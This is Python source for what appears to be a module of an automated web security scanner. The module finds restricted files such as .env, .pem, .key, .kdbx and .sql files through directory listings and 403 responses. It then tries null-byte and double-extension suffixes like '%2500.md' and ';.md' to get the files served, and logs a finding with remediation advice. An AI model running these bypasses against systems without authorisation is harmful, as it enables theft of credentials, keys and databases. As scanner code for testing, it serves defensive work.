"""Stage 5: File-serving filter bypass (null byte / double extension).

A static-file handler that allows only `.md`/`.pdf` but builds the path from
user input is bypassable: `package-lock.json.bak` is 403, but
`package-lock.json.bak%2500.md` is 200 and serves the restricted file. This
finds candidate restricted files (directory listings + 403'd file URLs) and
retries each with the classic extension-filter bypasses, confirming only when
a bypass flips a 403 into a 200 that actually serves different content.
"""

import re

from core.site_profile import get_profile
from modules.base import BaseModule
from tools.wrappers import curl, curl_with_status

_LISTING_DIRS = ("/ftp", "/files", "/download", "/downloads", "/uploads",
                 "/static", "/public", "/backup", "/assets")
_RESTRICTED_EXT = (".bak", ".json", ".config", ".pyc", ".kdbx", ".gg",
                   ".sql", ".log", ".env", ".yml", ".yaml", ".pem", ".key",
                   ".zip", ".tar", ".gz", ".db", ".sqlite")
# Suffixes that defeat a naive "ends with .md" allowlist.
_BYPASSES = ("%2500.md", "%00.md", ";.md", ".md", "%20.md", "%0a.md",
             "/.md", "%23.md")
_HREF = re.compile(r'href=["\']([^"\']+)["\']', re.I)


class FileAccessBypass(BaseModule):
    id = "file_access_bypass"
    name = "File-Serving Filter Bypass"
    stage = 5
    detectability = "medium"
    depends_on = ["tech_detection"]
    active = True

    async def run(self) -> str:
        base = self.base_url
        self._profile = await self._baseline(base)
        candidates = await self._candidates(base)
        if not candidates:
            self.state.skip_module(self.id, "no restricted file candidates")
            return "skipped"

        confirmed = 0
        for url in candidates[:20]:
            if self.should_stop(reserve=10):
                break
            if await self._try_bypass(base, url):
                confirmed += 1

        self.state.complete_module(self.id)
        self.log(f"File-access bypass: {confirmed} confirmed across "
                 f"{len(candidates)} candidate(s)")
        return "done"

    async def _candidates(self, base: str) -> list:
        urls: list[str] = []
        # 1. Directory listings → restricted-extension files.
        for d in _LISTING_DIRS:
            if self.should_stop(reserve=12):
                break
            try:
                r = await curl_with_status(base.rstrip("/") + d, timeout=10)
            except Exception:  # noqa: BLE001
                continue
            body = r.get("body", "") or ""
            if r.get("status") != 200 or self._catch_all(r.get("status", 0), body):
                continue
            for href in _HREF.findall(body):
                href = href.split("?")[0]
                if href.lower().endswith(_RESTRICTED_EXT):
                    full = href if href.startswith("http") else \
                        base.rstrip("/") + "/" + href.lstrip("/")
                    if full not in urls:
                        urls.append(full)
        # 2. url assets that misconfig recorded as 403.
        for a in self.state.get_assets_by_type("url"):
            if (a.get("attrs", {}) or {}).get("status") == 403:
                v = str(a.get("value", ""))
                if v.startswith(("http", "https")) and v not in urls:
                    urls.append(v)
        return urls

    async def _try_bypass(self, base: str, url: str) -> bool:
        try:
            direct = await curl_with_status(url, timeout=10)
        except Exception:  # noqa: BLE001
            return False
        # Only interesting if the direct fetch is blocked.
        if direct.get("status") not in (401, 403):
            return False
        blocked_len = len(direct.get("body", "") or "")
        for suffix in _BYPASSES:
            if self.should_stop(reserve=6):
                break
            try:
                r = await curl_with_status(url + suffix, timeout=10)
            except Exception:  # noqa: BLE001
                continue
            body = r.get("body", "") or ""
            if (r.get("status") == 200 and len(body) > max(50, blocked_len + 20)
                    and not self._catch_all(r.get("status", 0), body)):
                self.state.add_finding(
                    title="File-serving filter bypass (restricted file served)",
                    severity="HIGH", confidence="CONFIRMED",
                    category="Path Traversal",
                    description=f"A restricted file is blocked (403) directly but "
                                f"served (200) via an extension-filter bypass "
                                f"('{suffix}') — arbitrary download of files the "
                                f"allowlist was meant to protect.",
                    evidence=[f"{url} → {direct.get('status')}",
                              f"{url}{suffix} → 200 ({len(body)} bytes)"],
                    remediation="Resolve and canonicalise the path; enforce the "
                                "extension allowlist on the final resolved name; "
                                "reject null bytes and encoded separators.",
                    asset_keys=[f"webapp:{base}"],
                    verification={"method": "file_filter_bypass",
                                  "url": url + suffix})
                return True
        return False

    async def _baseline(self, base: str):
        async def fetch(path: str):
            r = await curl_with_status(base.rstrip("/") + path,
                                       follow_redirects=True)
            return (r.get("status", 0), r.get("body", "") or "",
                    r.get("content_type", "") or "")
        try:
            return await get_profile(base, fetch)
        except Exception:  # noqa: BLE001
            return None

    def _catch_all(self, status: int, body: str) -> bool:
        prof = getattr(self, "_profile", None)
        if prof is None:
            return False
        try:
            from core.response_fingerprint import fingerprint
            return prof.baseline.catch_all(fingerprint(status, body, ""))
        except Exception:  # noqa: BLE001
            return False
